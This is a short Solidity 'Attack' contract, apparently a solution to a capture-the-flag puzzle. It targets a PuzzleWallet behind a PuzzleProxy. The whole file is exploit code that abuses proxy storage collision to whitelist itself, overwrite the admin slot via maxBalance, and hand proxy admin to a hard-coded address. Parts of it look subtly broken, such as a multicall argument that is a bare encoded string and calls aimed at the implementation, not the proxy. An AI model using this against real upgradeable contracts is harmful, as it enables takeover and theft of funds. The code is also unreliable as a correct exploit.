// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Target.sol";

contract Attack {
    PuzzleProxy public proxy;
    PuzzleWallet public target;
    address irrelevant;
    address payable public owner;
    uint storedTime;

    constructor(address target_addr, address target_proxy) {
        target = PuzzleWallet(payable(target_addr));
        proxy = PuzzleProxy(payable(target_proxy));
        owner = payable(msg.sender);
    }

    function  attack () public
    {
        //First we let this contract become the owner
        target.init(0);

        //Now we whitelist this contract
        target.addToWhitelist(address(this));

        //Next we set Maxbalance to this contracts address
        target.setMaxBalance(uint256(uint160(address(this))));

        //Now we propose this contract as the new admin
        proxy.proposeNewAdmin(address(this));

        //multicall
        proxy.multicall(abi.encode("approveNewAdmin(address _expectedAdmin)"));
        //Now the attack contract should be the admin

        //Now we just need to let our player address become the owner of the proxy so it is finished
        proxy.proposeNewAdmin(0x2C17A5f47FF94Be930E74483BDa8FE0D3616AA1E);
        proxy.approveNewAdmin(0x2C17A5f47FF94Be930E74483BDa8FE0D3616AA1E);

        //DONE
    }
}